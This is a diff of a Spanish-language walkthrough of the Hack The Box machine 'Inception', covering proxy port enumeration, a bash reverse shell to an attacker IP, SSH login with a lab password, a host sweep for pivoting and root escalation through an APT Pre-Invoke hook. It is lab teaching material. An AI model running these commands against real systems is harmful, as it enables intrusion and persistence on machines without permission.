@@ -1,29 +1,28 @@
 10.10.10.67
 -----------
 
+![Inception](https://user-images.githubusercontent.com/96772264/197250483-3223aa07-2644-419e-a465-ebe1a85b2cd5.png)
+
+
+--------------------------------------------
+
+### PARTE 1. Reconocimiento
+
 Los puertos abiertos son el 80(http) y el 3128(squid proxy).
-
-El proxy se configura de tal manera, retocando el /etc/proxychains.conf con la linea: ```http 10.10.10.67 3128```
-Y comentando la *socks4* de antes  para que no entre en conflicto.
-
-Con el squid proxy se pueden hacer ciertas cosas como enumerar puertos:
-
-```console
-└─$ wfuzz -c --hc=404,503 -t 200 -z range,1-65535 -p 10.10.10.67:3128:HTTP http://127.0.0.1:FUZZ
-
-000000022:   200        2 L      4 W        60 Ch       "22"                                                 
-000000080:   200        1051 L   169 W      2877 Ch     "80"                                                 
-000003128:   400        151 L    416 W      3521 Ch     "3128"
-```
-
-Al puerto 22 solo se puede acceder por el proxy.
 
 En cuanto al puerto 80:
 ```console
 └─$ whatweb http://10.10.10.67
 http://10.10.10.67 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.67], Script, Title[Inception]
 ```
+--------------------------------------------
+
+### PARTE 2. Explotacion web
+
 Inspeccionamos la web y no tiene nada (un formulario para enviar un mail pero que no funciona).
+
+![Captura](https://user-images.githubusercontent.com/96772264/197250623-d486d59a-79be-42a8-a0f1-2f557bb0a42e.PNG)
+
 En cuanto a los comentarios en el código fuente:
 ```
 <!--[if lte IE 8]><script src="assets/js/ie/html5shiv.js"></script><![endif]-->
@@ -83,6 +82,9 @@ Asi que subirmeos el clasico:
 SI le pasamos el comando de reverse shell (con los & urlencodeados a %26)
 ```bash -c 'bash -i >%26 /dev/tcp/10.10.14.5/443 0>%261'```
 
+--------------------------------------------
+
+### PARTE 3. Fordward Shell
 La manera es hacer una fake shell para operar con un script [tty over http](https://github.com/CUCUxii/ttyhttp.py/blob/main/ttyhttp.py)
 
 ```console
@@ -116,19 +118,34 @@ Como estamos como root pero no hay flag, puede que estemos en un contenedor
 ~$: hostname -I
 192.168.0.10 
 ```
+--------------------------------------------
 
-Si hay que hacer pivoting, hay que detectar maquinas y demas, con esta shell limitada, el subir scripts se 
-hace impracticable. Asi que como tenemos la contraseña del Cobb este se usa para ssh.
+### PARTE 4. Squid Proxy
+
+El proxy se configura de tal manera, retocando el /etc/proxychains.conf con la linea: ```http 10.10.10.67 3128``` Y comentando la *socks4* de antes para que no 
+entre en conflicto. Con el squid proxy se pueden hacer ciertas cosas como enumerar puertos:
+
+```console
+└─$ wfuzz -c --hc=404,503 -t 200 -z range,1-65535 -p 10.10.10.67:3128:HTTP http://127.0.0.1:FUZZ
+000000022:   200        2 L      4 W        60 Ch       "22"                                                 
+000000080:   200        1051 L   169 W      2877 Ch     "80"                                                 
+000003128:   400        151 L    416 W      3521 Ch     "3128"
+```
+
+Al puerto 22 solo se puede acceder por el proxy.
+
+Si hay que hacer pivoting, hay que detectar maquinas y demas, con esta shell limitada, el subir scripts se  hace impracticable. Asi que como tenemos la contraseña
+del Cobb este se usa para ssh.
 ```console
 └─$ sudo proxychains sshpass -p 'VwPddNh7xMZyDQoByQL4' ssh cobb@127.0.0.1
 ```
+--------------------------------------------
 
-MIgramos a root de la misma manera que antes y para el pivoting tenemos que descubrir tanto la otra maquina
-como sus puertos
+### PARTE 4. Pivoting, camino a root
 
+MIgramos a root de la misma manera que antes y para el pivoting tenemos que descubrir tanto la otra maquina como sus puertos:
 ```bash
 #!/bin/bash
-
 for host in $(seq 1 254); do
     timeout 1 bash -c "ping -c 1 192.168.0.$host > /dev/null 2>&1" && echo "Host: 192.168.0.$host" &
 done; wait
@@ -157,9 +174,7 @@ root@Inception:~# cat crontab
 */5 *	* * *	root	apt update 2>&1 >/var/log/apt/custom.log
 30 23	* * *	root	apt upgrade -y 2>&1 >/dev/null
 ```
-Esto significa que se está actualizando el sistema cada 5 minutos. Si pones un archivo especial en:
-*/etc/apt/apt.conf.d/* se ejecutará antes de actualizar el sistema.
-
+Esto significa que se está actualizando el sistema cada 5 minutos. Si pones un archivo especial en: */etc/apt/apt.conf.d/* se ejecutará antes de actualizar el sistema.
 La manera que hay de explotar esto es escribiendo un archivo: *command*:
 
 ```APT::Update::Pre-Invoke {" whoami ";};``` En este caso:
@@ -176,6 +191,19 @@ root@Inception:/tmp# hostname -I
 hostname -I
 10.10.10.67 192.168.0.1 dead:beef::250:56ff:feb9:5325
 ```
-Con esto ya estaríamos en la segunda máquina
+Con esto ya estaríamos en la segunda máquina.
+
+--------------------------------------------
 
 Disclaimer: aprendi a resolver la maquina gracias al maestro @s4vitar.
+
+--------------------------------------------
+
+### EXTRA 1. ¿Que es un SQUID PROXY?
+
+Es un proxy (un servidor intermediario entre el cliente-servidor). Suele operar en el puertp 3128:
+
+* Está para mejorar peticiones ya que guarda en la cache (memoria) un registro de todas estas:
+> Cuando mucha gente haga las mismas peticiones, que en vez de responder una y otra vez saturando el servidor, se les manda la misma respuesta que se habia almacenado en dicha cache ) 
+* Tambien puede filtrar peticiones que detecte como *maliciosas* securizando el servidor (aunque en esta maquina securizar... poco)
+
